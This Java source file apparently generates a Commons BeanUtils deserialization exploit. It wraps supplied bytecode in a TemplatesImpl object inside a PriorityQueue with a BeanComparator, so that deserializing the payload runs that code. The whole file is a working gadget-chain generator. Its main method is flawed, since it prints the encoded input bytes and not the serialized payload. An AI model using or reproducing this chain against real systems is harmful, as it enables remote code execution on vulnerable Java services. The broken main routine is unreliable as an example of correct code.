package com.reajason.javaweb.deserialize;

import com.reajason.javaweb.deserialize.utils.Reflections;
import lombok.SneakyThrows;
import org.apache.commons.beanutils.BeanComparator;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;
import java.util.PriorityQueue;

/**
 * @author ReaJason
 * @since 2024/12/3
 */
public class CommonsBeanutils19 {
    @SneakyThrows
    public static Object getPayload(byte[] bytes) {
        Object obj = TemplateUtils.createTemplatesImpl(bytes);
        final BeanComparator<Object> comparator = new BeanComparator<>(null, String.CASE_INSENSITIVE_ORDER);
        final PriorityQueue<Object> queue = new PriorityQueue<>(2, comparator);
        queue.add("1");
        queue.add("1");
        Reflections.setFieldValue(comparator, "property", "outputProperties");
        Reflections.setFieldValue(queue, "queue", new Object[]{obj, obj});
        return queue;
    }

    public static void main(String[] args) {
        String base64 = "";
        byte[] bytes = Base64.getDecoder().decode(base64);
        Object payload = getPayload(bytes);
        byte[] serialize = serialize(payload);
        System.out.println(new String(Base64.getEncoder().encode(bytes)));
    }

    @SneakyThrows
    public static byte[] serialize(Object obj) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        oos.flush();
        oos.close();
        return baos.toByteArray();
    }
}